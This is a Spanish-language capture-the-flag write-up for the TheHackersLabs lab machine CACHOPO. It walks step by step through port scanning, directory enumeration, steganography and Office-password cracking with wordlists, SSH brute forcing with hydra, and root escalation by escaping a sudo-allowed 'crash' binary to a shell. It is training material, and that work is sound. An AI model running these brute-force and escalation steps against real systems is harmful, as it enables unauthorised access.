# <p align="center">Laboratorio de Ciberseguridad: Resolución de la Máquina CACHOPO 🧠</p>

<p align="center">
  <img src="Imagenes/Cachopo.png">
</p>

<p align="center">🖥️ **Plataforma: TheHackersLabs** 🖥️</p>

---

<p align="center">
  <img src="Imagenes/GRUPO URTG.png">
</p>

---

## <p align="center">Objetivo del Laboratorio</p>

El propósito de este ejercicio es simular un entorno de intrusión controlada mediante técnicas ofensivas: reconocimiento activo, enumeración de servicios, análisis de archivos y escalada de privilegios. Trabajaremos con la máquina **CACHOPO**, la cual representa un entorno vulnerable realista dentro de una red aislada.

---

## 🚀 Inicio del Entorno y Reconocimiento de Red

1. 🔌 **Ejecución de la máquina CACHOPO**  
   - IP asignada: `172.20.10.2`

2. ✅ **Validación de conectividad entre máquinas**
   ```bash
   ping 172.20.10.2
   ```

3. 🔎 **Escaneo de puertos expuestos**
   ```bash
   sudo nmap 172.20.10.2
   ```
   > Se detectan puertos abiertos: `22 (SSH)` y `80 (HTTP)`

---

## 🌐 Enumeración del Servicio Web

1. 🔍 **Acceso al sitio desde el navegador**
2. 🗂️ **Exploración de directorios ocultos con Gobuster**
   ```bash
   gobuster dir -u http://172.20.10.2 -w /usr/share/wordlists/dirbuster/...
   ```
   > Primer escaneo devuelve códigos 301 (redirección), por lo que se ajusta el comando.

3. 🔐 **Segunda ejecución detecta códigos 403 (acceso denegado)**:
   - `.htaccess`, `.htpasswd`, `/server-status`

4. 🛡️ **Escaneo con Nikto revela dominio virtual:**
   ```
   http://cachopo.thl
   ```

5. 🛠️ **Solución: añadir dominio al archivo de hosts**
   ```bash
   echo "172.20.10.2 cachopo.thl" >> /etc/hosts
   ```

---

## 🖼️ Análisis de Imagen y Esteganografía

1. 📥 **Descarga de imagen desde el sitio**
2. 🔍 **Verificación de metadatos**
   ```bash
   exiftool cachopo.jpg
   ```

3. 🔐 **Intento de extracción con steghide**
   ```bash
   steghide extract -sf cachopo.jpg
   ```

4. 🔓 **Ataque por diccionario con stegcracker**
   ```bash
   stegcracker cachopo.jpg /usr/share/wordlists/rockyou.txt
   ```
   > Contraseña encontrada: `doggies`

5. 📂 **Extracción del archivo oculto**
   ```bash
   steghide extract -sf cachopo.jpg -p doggies
   ```

---

## 📁 Descubrimiento de Archivo Protegido

1. 🌐 **Acceso a `/mycachopo` → archivo `cocineros.txt`**
2. 🔍 **Análisis del archivo**
   ```bash
   file cocineros.txt
   ```
   > Resultado: Formato cifrado CDFV2

3. 📝 **Renombrar para apertura como documento**
   ```bash
   mv cocineros.txt cocineros.doc
   libreoffice cocineros.doc
   ```

4. 🔐 **Ataque de contraseña con John the Ripper**
   ```bash
   python3 /usr/share/john/office2john.py cocineros.doc > hash.txt
   john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```
   > Contraseña: `horse1`

5. 🧑‍💻 **Contenido recuperado**: usuarios posibles → `Sofia`, `Carlos`, `Luis`

---

## 🛠️ Ataque por Fuerza Bruta (SSH)

1. 🧾 **Crear archivo de usuarios**
   ```bash
   echo -e "Sofia\nCarlos\nLuis" > user.txt
   ```

2. 🔓 **Ejecutar hydra**
   ```bash
   hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.2
   ```
   > Acceso válido: `carlos : [contraseña descubierta]`

3. 🖥️ **Ingreso al sistema**
   ```bash
   ssh carlos@172.20.10.2
   ```

---

## 🔝 Escalada de Privilegios

1. 🔍 **Verificación de permisos sudo**
   ```bash
   sudo -l
   ```
   > El usuario puede ejecutar `/usr/bin/crash` como root sin contraseña

2. 🚨 **Explotación del binario crash**
   ```bash
   sudo /usr/bin/crash
   !sh
   ```

3. ✅ **Confirmación de acceso root**
   ```bash
   whoami
   # root
   ```

---

## 🧾 Conclusiones

- ✅ La máquina **CACHOPO** permitió aplicar múltiples técnicas de pentesting en un solo flujo.
- 🔧 Se demostró cómo un binario con permisos mal gestionados puede convertirse en un vector de escalada.
- 🧠 El ejercicio integró herramientas clave: `nmap`, `gobuster`, `nikto`, `steghide`, `john`, `hydra`, y `sudo`.

---

## 📚 Referencias

- https://curiosidadesdehackers.com/resolucion-de-la-maquina-cachopo/
- https://medium.com/@D4nYeD/plataforma-thehackerslabs-ctf-write-up-cachopo-f84b11198dd0
- `man nmap`, `man steghide`, `man john`, `man sudo
